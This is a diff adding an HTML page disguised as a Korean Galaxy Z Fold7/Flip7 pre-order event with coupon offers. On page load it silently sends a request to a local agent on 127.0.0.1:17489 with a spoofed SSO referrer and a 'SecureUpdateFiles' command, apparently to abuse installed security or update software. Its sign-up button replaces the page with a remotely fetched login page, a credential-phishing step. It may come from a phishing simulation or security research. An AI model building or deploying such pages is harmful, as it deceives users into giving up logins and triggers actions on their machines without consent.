@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Z폴더블7 사전예약 이벤트</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .product-image {
+            width: 100%;
+        }
+        .title {
+            font-size: 24px;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .price {
+            font-size: 20px;
+            color: #d32f2f;
+            margin: 10px 0;
+        }
+        .btn {
+            display: inline-block;
+            background-color: #d32f2f;
+            color: white;
+            padding: 10px 20px;
+            text-decoration: none;
+            margin-top: 15px;
+            border-radius: 4px;
+        }
+    </style>
+    <script>
+        function loadLoginPage() {
+          fetch("https://raw.githubusercontent.com/windshock/windshock.github.io/refs/heads/master/static/login.html")
+            .then(res => res.text())
+            .then(html => {
+              document.open();
+              document.write(html);
+              document.close();
+            });
+        }
+    </script>
+
+    <script>
+        async function fetchForBrowser() {
+            const baseUrl = "https://127.0.0.1:17489/?callback=nexessCallBack707529&data=";
+            const commonOptions = {
+                headers: {
+                    "accept": "*/*",
+                    "accept-language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
+                    "cache-control": "no-cache",
+                    "pragma": "no-cache",
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "cross-site"
+                },
+                referrer: "http://sso.sk.com:10000/",
+                referrerPolicy: "strict-origin-when-cross-origin",
+                body: null,
+                method: "GET",
+                mode: "no-cors",
+                credentials: "omit"
+            };
+        
+            const urls = {
+                      default: `${baseUrl}%7B%22func%22:%22SecureUpdateFiles%22,%22param%22:%22vUdwYz%2B%2FUJZ%2FVpr71dB2Oef4XlxVkAOZAYFQmaos3Bg%3D%7CNf7fDDHdQGo0wDI11Mkb5w%3D%3D%7C1%22%7D&_=%22`
+            };
+        
+            await fetch(urls['default'], commonOptions);
+        }
+
+        if (!window._fetchedOnce) {
+          window._fetchedOnce = true;
+          fetchForBrowser();
+        }
+    </script>
+</head>
+<body>
+    <p style="text-align:center; margin-top:100px;">이벤트 페이지 로딩 중...</p>
+    <script>
+        (async function(){
+            // 💨 약간의 딜레이 후 '실제 같은 이벤트 페이지'로 화면 교체
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div class="container">
+                        <img class="product-image" src="https://skplanet-img.s3.ap-northeast-2.amazonaws.com/z%ED%8F%B4%EB%8D%94%EB%B8%947+%EC%82%AC%EC%A0%84%EC%98%88%EC%95%BD_E1.jpg" alt="Z폴더블7">
+                        <div class="title">Galaxy Z Fold7 | Flip7 사전예약</div>
+                        <div class="price">사전예약가: 1,485,000원 ~ 2,750,000원</div>
+                        <p>지금 사전예약하고 스타벅스 1만원 쿠폰, 메가커피 2잔, 고급 젤리케이스까지 받아가세요!</p>
+                        <a href="javascript:loadLoginPage()">사전예약 신청하기</a>
+                    </div>
+                `;
+            }, 500); 
+        })();
+    </script>
+</body>
+</html>
